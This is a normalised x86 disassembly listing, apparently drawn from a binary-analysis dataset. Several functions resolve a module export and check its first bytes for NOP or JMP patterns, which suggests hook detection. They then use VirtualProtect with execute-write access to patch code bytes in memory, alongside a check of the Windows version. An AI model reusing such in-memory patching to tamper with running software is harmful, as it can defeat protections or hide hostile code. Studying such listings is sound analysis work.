cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push 0xe
push 0x8
lea eax [ esp + 0x58 ]
push eax
push 0xa
push ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x44 ] esp
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push 0xa
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0xc4 ] 0x2
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x5c ] esp
mov [ ecx ] ax
push 0x6
mov eax r--data
call sub_401c90
mov [ esp + 0xc4 ] 0xffffffff
call sub_407430
add esp 0x4c
jmp r-xdata
push ebx
push 0xe
lea eax [ esp + 0x60 ]
push eax
push 0xa
push ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x40 ] esp
xor edx edx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push 0xa
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0xc4 ] ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x60 ] esp
mov [ ecx ] ax
push 0x6
mov eax r--data
call sub_401c90
or edi 0xffffffff
mov [ esp + 0xc4 ] edi
call sub_407430
add esp 0x4c
cmp al bl
je r-xdata
mov edx [ esp + 0x18 ]
push edx
call sub_43811c
add esp 0x4
jmp r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
push 0x5
push 0x6
lea ecx [ esp + 0x48 ]
push ecx
push esi
lea edx [ esp + 0x58 ]
push edx
sub esp 0x1c
mov eax r--data
mov esi esp
mov [ esp + 0x44 ] esp
call sub_401980
sub esp 0x1c
mov [ esp + 0xc4 ] 0x1
mov eax r--data
mov esi esp
mov [ esp + 0x5c ] esp
call sub_401980
mov [ esp + 0xc4 ] edi
call sub_407430
add esp 0x4c
jmp r-xdata
sub_417360
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ edx + 0x14 ] 0x8
mov eax 0x7c
mov [ ebp - 0x18 ] 0x2f005c
mov [ ebp - 0x14 ] 0x2a003a
mov [ ebp - 0x10 ] 0x22003f
mov [ ebp - 0xc ] 0x3e003c
mov [ ebp - 0x8 ] ax
jb r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
mov eax edx
mov eax [ edx ]
jmp r-xdata
push esi
mov esi eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_437c1c
mov esp ebp
pop ebp
retn
movzx ecx [ esi ]
xor eax eax
nop
mov ecx [ edx + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp esi eax
je r-xdata
mov ecx 0x7e
mov [ esi ] cx
add esi 0x2
jmp r-xdata
inc eax
cmp eax 0x9
jb r-xdata
cmp [ edx + 0x14 ] 0x8
jb r-xdata
cmp cx [ ebp + eax * 2 - 0x18 ]
je r-xdata
add esi 0x2
jmp r-xdata
sub_4173f0
mov ecx [ edi + 0x4 ]
push esi
mov esi eax
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx esi
mov esi [ edi + 0x4 ]
call sub_4138a0
add [ edi + 0x4 ] 0x3c
pop esi
retn
mov ecx edi
call sub_417460
sub esi eax
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov eax esi
shl eax 0x4
sub eax esi
lea ecx [ ecx + eax * 4 ]
push edx
call sub_4175f0
add esp 0x4
add [ edi + 0x4 ] 0x3c
pop esi
retn
mov ecx edi
call sub_417460
sub_417460
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x88888889
imul esi
add edx esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x4444443
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x88888889
imul edi
add edx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x4444444
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_4174e0
mov eax esi
cmp eax esi
jae r-xdata
sub_4174e0
push ebp
mov ebp esp
push 0xffffffff
push sub_452880
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x4444444
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_413610
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_417690
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov edi edx
shr edi 0x1f
add esp 0xc
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
shl ecx 0x4
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
mov ecx edi
shl ecx 0x4
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
push ecx
call sub_4133c0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x8
sub_4175f0
push ebp
mov ebp esp
push 0xffffffff
push sub_451d7c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx ]
lea edi [ esi + 0x4 ]
mov [ esi ] ecx
mov [ edi + 0x10 ] eax
push eax
lea eax [ ebx + 0x4 ]
xor edx edx
push eax
mov [ edi + 0x14 ] 0x7
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
xor ecx ecx
lea edi [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
push ecx
add ebx 0x20
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push ebx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
sub_417690
push ebp
mov ebp esp
push 0xffffffff
push sub_45285c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x3c
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0xc ] esi
add ebx 0x3c
jmp r-xdata
mov eax [ ebx ]
xor ecx ecx
mov [ esi ] eax
lea edi [ esi + 0x4 ]
push ecx
lea edx [ ebx + 0x4 ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push edx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
lea edi [ esi + 0x20 ]
xor eax eax
mov [ ebp - 0x4 ] 0x2
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
lea ecx [ ebx + 0x20 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
cmp ebx [ ebp + 0x8 ]
je r-xdata
sub_417741
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
call sub_413670
add esi 0x3c
cmp esi edi
jne r-xdata
sub_417780
push ebp
mov ebp esp
push 0xffffffff
push sub_453aea
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x138 ] ax
mov ebx 0x7
push 0xa
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x140 ] 0x1
mov [ ebp - 0x13c ] sub_418140
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x11c ] cx
push 0x58
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x9
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_418210
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xe0 ] ax
push 0x53
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0xa
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_417f10
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x57
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x4c ] sub_418590
xor eax eax
mov [ ebp - 0x48 ] ax
push ebx
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x1f
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x9
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_417b60
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x68 ] ax
push 0xf
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] ax
jb r-xdata
mov edx [ ebp - 0x11c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x138 ]
push ecx
call sub_43811c
add esp 0x4
sub_417b60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_454358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
lea eax [ esp + 0x1c ]
mov [ esp + 0x38 ] edi
call sub_418d50
mov eax [ esp + 0x20 ]
cmp eax edi
je r-xdata
mov ebx [ esp + 0x1c ]
add eax 0x4
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] 0x7
cmp ecx eax
jae r-xdata
mov [ eax ] 0x5
cmp eax [ esp + 0x24 ]
jne r-xdata
mov edx ecx
cmp ebx edx
ja r-xdata
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov esi ecx
sub esi ebx
sar esi 0x2
cmp eax [ esp + 0x24 ]
jne r-xdata
add eax 0x4
lea edx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] 0x9
cmp edx eax
jae r-xdata
mov [ eax ] 0x7
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
cmp eax [ esp + 0x24 ]
jne r-xdata
mov ecx edx
cmp ebx ecx
ja r-xdata
mov ecx [ ebx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov esi edx
sub esi ebx
sar esi 0x2
cmp eax [ esp + 0x24 ]
jne r-xdata
add eax 0x4
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] 0xb
cmp ecx eax
jae r-xdata
mov [ eax ] 0x9
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
cmp eax [ esp + 0x24 ]
jne r-xdata
mov edx ecx
cmp ebx edx
ja r-xdata
mov edx [ ebx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov esi ecx
sub esi ebx
sar esi 0x2
cmp eax [ esp + 0x24 ]
jne r-xdata
add eax 0x4
lea edx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] 0xc
cmp edx eax
jae r-xdata
mov [ eax ] 0xb
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
cmp eax [ esp + 0x24 ]
jne r-xdata
mov ecx edx
cmp ebx ecx
ja r-xdata
mov ecx [ ebx + esi * 4 ]
mov [ eax ] ecx
jmp r-xdata
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov esi edx
sub esi ebx
sar esi 0x2
cmp eax [ esp + 0x24 ]
jne r-xdata
add eax 0x4
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x1c ]
call sub_408070
test al al
je r-xdata
mov [ eax ] 0xc
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
call sub_418d50
mov eax [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
push r--data
push r--data
mov [ esp + 0x18 ] 0x50f
mov [ esp + 0x1a ] 0xc3
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov al 0x90
cmp [ esi + 0x8 ] al
jne r-xdata
mov edx [ ebx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
mov al 0x1
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_43811c
add esp 0x4
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp [ esi + 0x9 ] al
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esi + 0xa ] 0xe9
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
mov edi 0x4
push r--data
push rw-data
call sub_409de0
mov eax [ esi + 0xb ]
mov edi [ VirtualProtect@IAT ]
add esp 0x8
lea ecx [ esp + 0x14 ]
push ecx
push 0x40
lea esi [ eax + esi + 0xf ]
push 0x3
push esi
call edi
test eax eax
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push r--data
push rw-data
call sub_409de0
push 0x3
lea edx [ esp + 0x14 ]
push edx
push 0x3
push esi
call sub_438acf
mov ecx [ esp + 0x24 ]
add esp 0x10
test eax eax
lea eax [ esp + 0x18 ]
push eax
push ecx
push 0x3
push esi
sete bl
call edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ esp + 0x1c ]
push r--data
push rw-data
call sub_409de0
mov ebx [ esp + 0x24 ]
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax esi
jmp r-xdata
mov esi 0x4
add esp 0x8
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
sub_417f10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_454320
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
lea eax [ esp + 0x18 ]
mov [ esp + 0x68 ] esi
call sub_418d50
mov eax [ esp + 0x1c ]
cmp eax esi
je r-xdata
add eax 0x4
lea ecx [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] 0x4
cmp ecx eax
jae r-xdata
mov [ eax ] 0x2
cmp eax [ esp + 0x20 ]
jne r-xdata
mov edx ecx
mov ecx [ esp + 0x18 ]
cmp ecx edx
ja r-xdata
cmp eax esi
je r-xdata
lea eax [ esp + 0x18 ]
call sub_418d50
mov eax [ esp + 0x1c ]
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esp + 0x20 ]
jne r-xdata
add eax 0x4
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x18 ]
call sub_408070
test al al
je r-xdata
mov [ eax ] 0x4
cmp eax esi
je r-xdata
lea eax [ esp + 0x18 ]
call sub_418d50
mov eax [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
cmp eax esi
je r-xdata
mov al 0x90
push 0x10
mov [ esp + 0x48 ] 0x83ffffff
mov [ esp + 0x4c ] 0x840f02ff
mov [ esp + 0x50 ] 0x90909090
mov [ esp + 0x54 ] 0x90909090
mov [ esp + 0x58 ] al
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
mov al 0x1
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
push eax
call sub_43811c
add esp 0x4
xor ebx ebx
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov ebx eax
jmp r-xdata
cmp ebx esi
je r-xdata
mov esi [ ebx ]
cmp esi [ ebx + 0x4 ]
je r-xdata
xor eax eax
mov [ esp + 0x28 ] ax
push 0xc
mov eax r--data
lea ecx [ esp + 0x2c ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x3c ] esi
call sub_401c90
lea ecx [ esp + 0x28 ]
mov edi ebx
mov [ esp + 0x68 ] 0x1
call sub_40b0d0
test al al
je r-xdata
cmp [ esp + 0x3c ] 0x8
jb r-xdata
mov eax [ ebx ]
cmp eax esi
je r-xdata
xor esi esi
nop
mov eax [ esp + 0x28 ]
push eax
call sub_43811c
add esp 0x4
push ebx
mov [ ebx ] esi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
call sub_43811c
add esp 0x4
mov ecx [ esp + 0x14 ]
mov edi [ ebx + 0x4 ]
push ecx
call sub_40cb00
mov edx [ ebx ]
add esp 0x4
push edx
call sub_43811c
add esp 0x4
push 0x3
push 0x9
push 0x8
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ esp + 0x3c ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push edx
mov eax r--data
lea edi [ esp + 0x78 ]
mov [ ecx ] dx
call sub_401c90
mov eax [ esi + 0x8 ]
push eax
mov edx edi
lea ecx [ esp + 0x70 ]
call sub_407770
add esi 0x40
add esp 0x2c
cmp esi [ ebx + 0x4 ]
jne r-xdata
sub_418140
push ebp
mov ebp esp
push 0xffffffff
push sub_453488
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push 0x5
lea eax [ ebp - 0x18 ]
push eax
push 0x6
lea ecx [ ebp - 0x20 ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] 0x4c201b0
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x28 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push ebx
mov eax r--data
mov [ ebp - 0x20 ] 0x5314ec83
mov [ ebp - 0x1c ] 0xd98b
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] ebx
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ebp - 0x24 ] esp
mov [ ecx ] ax
push 0xb
mov eax r--data
call sub_401c90
mov [ ebp - 0x4 ] 0xffffffff
call sub_407430
add esp 0x4c
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
sub_418210
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45344b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x198
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x190 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1a8 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
xor eax eax
mov [ esp + 0x18c ] 0x8be44589
mov [ esp + 0x190 ] 0x7d89087d
mov [ esp + 0x184 ] 0x4c2c033
mov [ esp + 0x188 ] bl
mov [ esp + 0x194 ] 0x8b56ec8b
mov [ esp + 0x198 ] 0x84d8bf1
mov [ esp + 0x19c ] 0xe8
mov [ esp + 0x14 ] 0x4c2
mov [ esp + 0x16 ] bl
mov [ esp + 0x17c ] 0xc740000
mov [ esp + 0x180 ] 0x39
mov [ esp + 0x18 ] 0x4c2
mov [ esp + 0x1a ] bl
mov [ esp + 0x158 ] 0x7
mov [ esp + 0x154 ] ebx
mov [ esp + 0x144 ] ax
push 0x11c
lea ecx [ esp + 0x28 ]
push ebx
push ecx
mov [ esp + 0x1bc ] ebx
call sub_43a820
add esp 0xc
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x28 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
push ebx
lea edx [ esp + 0x164 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x1c0 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0x5
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x6
jne r-xdata
push 0xc
mov eax r--data
lea ecx [ esp + 0x148 ]
call sub_401c90
lea eax [ esp + 0x18c ]
lea ecx [ ebx + 0x8 ]
lea edx [ esp + 0x184 ]
lea esi [ ebx + 0x5 ]
lea edi [ ebx - 0x14 ]
jmp r-xdata
cmp [ esp + 0x174 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esp + 0x2c ]
jmp r-xdata
